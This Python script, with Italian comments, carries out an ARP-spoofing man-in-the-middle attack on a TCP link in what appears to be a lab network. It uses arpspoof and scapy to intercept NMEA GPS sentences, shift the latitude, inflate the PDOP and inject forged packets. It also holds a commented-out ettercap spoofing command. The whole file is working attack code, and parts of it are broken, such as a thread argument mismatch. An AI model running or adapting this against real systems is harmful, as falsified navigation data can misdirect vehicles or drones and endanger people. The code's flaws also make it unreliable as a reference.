



import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP
import socket
import re
from scapy.all import Ether, ARP, srp, send,Raw
import time
import os
import sys
import threading
import subprocess



# Massimo numero di sequenza possibile in TCP
biggest_seq_nr = (1 << 32) - 1




def get_local_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.1)
    try:
        s.connect(('10.255.255.255', 1))
        ip_address = s.getsockname()[0]
    except Exception as e:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    return ip_address

 # def spoof(client_ip, server_ip, verbose=True):
    
    # Comando di Ettercap per ARP spoofing
    ettercap_command = f"ettercap -T -i eth0 -M arp:remote /{client_ip}// /{server_ip}//"

    # Esegui il comando di Ettercap utilizzando subprocess
    subprocess.run(ettercap_command, shell=True)




def modify_coordinates(nmea_data):
    modified_data = []

    for line in nmea_data:
        if line.startswith("$GPGGA"):
            parts = line.split(",")
            latitude_degrees = int(parts[2][:2])
            latitude_minutes = float(parts[2][2:])
            print(f"Latitudine Originale (GPGGA): {latitude_degrees:02d}{latitude_minutes:06.3f}")
            latitude_degrees += 10
            latitude_minutes += 10
            if latitude_minutes >= 60:
                latitude_degrees += 1
                latitude_minutes -= 60

            parts[2] = f"{latitude_degrees:02d}{latitude_minutes:06.3f}"
            print(f"Latitudine Modificata (GPGGA): {latitude_degrees:02d}{latitude_minutes:06.3f}")
            modified_data.append(",".join(parts))
        elif line.startswith("$GPGSA"):
            parts = line.split(",")
            pdop = float(parts[15])
            print(f"PDOP Originale (GPGSA): {pdop:.1f}")
            pdop += 10
            parts[15] = f"{pdop:.1f}"
            print(f"PDOP Modificato (GPGSA): {pdop:.1f}")
            modified_data.append(",".join(parts))
        elif line.startswith("$GPRMC"):
            parts = line.split(",")
            latitude_degrees = int(parts[3][:2])
            latitude_minutes = float(parts[3][2:])
            print(f"Latitudine Originale (GPRMC): {latitude_degrees:02d}{latitude_minutes:06.3f}")
            latitude_degrees += 10
            latitude_minutes += 10
            if latitude_minutes >= 60:
                latitude_degrees += 1
                latitude_minutes -= 60

            parts[3] = f"{latitude_degrees:02d}{latitude_minutes:06.3f}"
            print(f"Latitudine Modificata (GPRMC): {latitude_degrees:02d}{latitude_minutes:06.3f}")
            modified_data.append(",".join(parts))
        else:
            modified_data.append(line)

    return modified_data

def calculate_new_sequence(original_seq, payload_length):
    return (original_seq + payload_length) % biggest_seq_nr


def calculate_new_acknowledgment(original_ack, old_payload_length, new_payload_length):
    return (original_ack + old_payload_length + new_payload_length) % biggest_seq_nr



def handle_packet(packet, target_ip, target_port, client_port):
    if IP in packet and TCP in packet and hasattr(packet[TCP], 'load'):
        if packet[IP].dst == target_ip and packet[TCP].dport == target_port:
            nmea_data = packet[TCP].load.decode("ascii").split("\r\n")
            print("Pacchetto ricevuto:")
            print(nmea_data)

            modified_nmea_data = modify_coordinates(nmea_data)

            # Calcola i nuovi ack e seq
            original_seq = packet[TCP].seq
            original_ack = packet[TCP].ack
            new_seq = calculate_new_sequence(original_seq, len(packet[TCP].load))
            new_ack = calculate_new_acknowledgment(original_ack, 0, len(packet[TCP].load))

            # Crea un pacchetto modificato
            modified_packet = IP(
                src=packet[IP].src,
                dst=packet[IP].dst
            ) / TCP(
                sport=packet[TCP].sport,
                dport=packet[TCP].dport,
                seq=new_seq,
                ack=new_ack,
                flags=packet[TCP].flags,
                options=packet[TCP].options
            ) / Raw(load=modified_nmea_data)
            
            print("Pacchetto Originale:")
            packet.show()
            print("Pacchetto Modificato:")
            modified_packet.show()

       
            send(modified_packet, verbose=False)
            print("Pacchetto modificato ed inviato.")
            time.sleep(1)  

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    

def ripristina(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Inviato a {} : {} è {}".format(target_ip, host_ip, host_mac))

def spoofing_loop(client_ip, server_ip):
        while True:
            subprocess.run(["arpspoof", "-i", "eth0", "-t", client_ip, server_ip], check=False)
            subprocess.run(["arpspoof", "-i", "eth0", "-t", server_ip, client_ip], check=False)
            time.sleep(1)

       

def sniffing_loop(client_ip, client_port, server_ip, server_port):
    while True:
         scapy.sniff(
            iface="eth0",  
            filter=f"tcp and (src host {client_ip} and src port {client_port})",
            prn=lambda x: handle_packet(x, server_ip, server_port, client_port),
        )

def main():
    # Abilita l'inoltro IP
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    client_ip = "172.18.0.3"
    client_port = 3000
    server_ip = "172.18.0.2"
    server_port = 5762
    verbose = True

   

    spoofing_thread = threading.Thread(target=spoofing_loop, args=(client_ip, server_ip, verbose))
    spoofing_thread.start()

    sniffing_thread = threading.Thread(target=sniffing_loop, args=(client_ip, client_port, server_ip, server_port))
    sniffing_thread.start()

if __name__ == "__main__":
    main()
